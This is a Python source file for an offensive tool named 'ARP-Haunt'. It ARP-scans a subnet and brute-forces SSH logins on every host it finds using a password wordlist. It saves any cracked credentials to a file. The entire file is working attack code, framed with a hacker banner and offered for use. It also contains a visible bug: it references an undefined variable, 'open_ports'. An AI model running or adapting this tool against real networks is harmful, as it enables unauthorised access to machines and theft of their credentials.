#!/usr/bin/env python3

import scapy.all as scapy
import os
import sys
import socket
import paramiko
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import time

class stl():
    RED = '\033[31m'
    GRN = '\033[32m'
    BLU = '\033[34m'
    CYN = '\033[36m'
    RST = '\033[0m'
    MGN = '\033[35m'
    YLW = '\033[33m'

print(f"""
{stl.MGN}╔════════════════════════════════════════════════╗{stl.RST}
{stl.MGN}║{stl.RED}  ▄▄▄· ▄▄▄   ▄▄▄·     ▄ .▄ ▄▄▄· ▄• ▄▌ ▐ ▄ ▄▄▄▄▄ {stl.MGN}║═╗{stl.RST}
{stl.MGN}║{stl.RED} ▐█ ▀█ ▀▄ █·▐█ ▄█    ██▪▐█▐█ ▀█ █▪██▌•█▌▐█•██   {stl.MGN}║ ║{stl.RST}
{stl.MGN}║{stl.RED} ▄█▀▀█ ▐▀▀▄  ██▀·    ██▀▐█▄█▀▀█ █▌▐█▌▐█▐▐▌ ▐█.▪ {stl.MGN}║ ║{stl.RST}
{stl.MGN}║{stl.RED} ▐█ ▪▐▌▐█•█▌▐█▪·•    ██▌▐▀▐█ ▪▐▌▐█▄█▌██▐█▌ ▐█▌· {stl.MGN}║ ║{stl.RST}
{stl.MGN}║{stl.RED}  ▀  ▀ .▀  ▀.▀       ▀▀▀ · ▀  ▀  ▀▀▀ ▀▀ █▪ ▀▀▀  {stl.MGN}║ ║{stl.RST}
{stl.MGN}║{stl.RED}                                         v1.0   {stl.MGN}║ ║{stl.RST}
{stl.MGN}╚════════════════════════════════════════════════╝{stl.MGN} ║{stl.RST}
{stl.MGN} ║{stl.RED}    #m0d3ls!          aurora.oops.wtf            {stl.MGN}║{stl.RST}
{stl.MGN} ╚═════════════════════════════════════════════════╝{stl.RST}
""")

if os.geteuid() != 0:
    sys.exit(f"[{stl.RED}-{stl.RST}] Must run as sudo!")

target_ip = input(f"[{stl.BLU}*{stl.RST}] IP range (192.168.0.0/24): ") or "192.168.0.0/24"
port = int(input(f"[{stl.BLU}*{stl.RST}] Port (22): ") or 22)
list_file = input(f"[{stl.BLU}*{stl.RST}] Wordlist (funlist): ") or "funlist"
username = input(f"[{stl.BLU}*{stl.RST}] Username (h4x0r1337): ") or "h4x0r1337"

login_file = "successful_logins.txt"



funlist_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "funlist")

if not os.path.exists(funlist_path):
    open(funlist_path, "a").close()
    print(f"[{stl.GRN}*{stl.RST}] Created funlist")

if not os.path.exists(login_file):
    with open(login_file, 'w') as file:
        file.write("Timestamp - IP:Port - Username:Password\n")
    print(f"[{stl.BLU}*{stl.RST}] Created {login_file}")

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]
    results = list(map(lambda e: {"ip": e[1].psrc, "mac": e[1].hwsrc}, answered_list))   
    return results

def check_port(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(2)
        return sock.connect_ex((ip, port)) == 0

def attempt_ssh_login(ip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        ssh.connect(ip, port, username, password, timeout=5)
        tqdm.write(f"[{stl.GRN}*{stl.RST}] Success!\t\t\t {stl.YLW}{username}{stl.RST}:{stl.YLW}{password}{stl.RST} @ {stl.CYN}{timestamp}{stl.RST}")
        with open(login_file, 'a') as file:
            file.write(f"{timestamp} - {ip}:{port} - {username}:{password}\n")
            tqdm.write(f"[{stl.GRN}+{stl.RST}] File saved!")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        tqdm.write(f"[{stl.RED}-{stl.RST}] No joy!\t\t\t {stl.YLW}{username}{stl.RST}:{stl.YLW}{password}{stl.RST}")
    except socket.timeout:
        tqdm.write(f"[{stl.RED}-{stl.RST}] Timeout connecting to\t {ip}:{port}.")
    ssh.close()
    return False

def process_host(ip, mac, position):
    print(f"[{stl.BLU}*{stl.RST}] Found:\t\t\t {stl.MGN}{ip}{stl.RST}\t\t ({mac})")
    if check_port(ip, port):
        if open_ports:
            print(f"[{stl.GRN}+{stl.RST}] Open:\t\t\t {stl.GRN}{ip}{stl.RST}:{stl.GRN}{port}{stl.RST} \t attempting login...\n")
            with open(list_file, 'r') as wordlist:
                for password in tqdm(wordlist.readlines(), desc=f"Brute-forcing {ip}", unit="pwd", dynamic_ncols=True, colour="red", position=position + 1, leave=False):
                    if attempt_ssh_login(ip, port, username, password.strip()):
                        break

def main():
    start_time = time.time()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    scan_results = scan(target_ip)
    print(f"\n[{stl.BLU}*{stl.RST}] ARP-Haunting {stl.MGN}{target_ip}{stl.RST} as {stl.YLW}{username}{stl.RST} on port {stl.MGN}{port}{stl.RST} started @ {stl.CYN}{timestamp}{stl.RST}")

    if not scan_results:
        print(f"[{stl.RED}-{stl.RST}] No devices found!")
        return
    print(f"[{stl.BLU}*{stl.RST}] {len(scan_results)} devices detected")

    with tqdm(total=len(scan_results), unit="host", colour="green", position=0, leave=False, bar_format="{desc}") as pbar:
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(process_host, result["ip"], result["mac"], idx): result for idx, result in enumerate(scan_results)}
            for future in as_completed(futures):
                pbar.update(1)

    end_time = time.time()
    duration = end_time - start_time
    print(f"[{stl.BLU}*{stl.RST}] Scan completed at\t\t {stl.CYN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{stl.RST}\t Total time: {stl.CYN}{duration:.2f}s{stl.RST}")


if __name__ == "__main__":
    main()
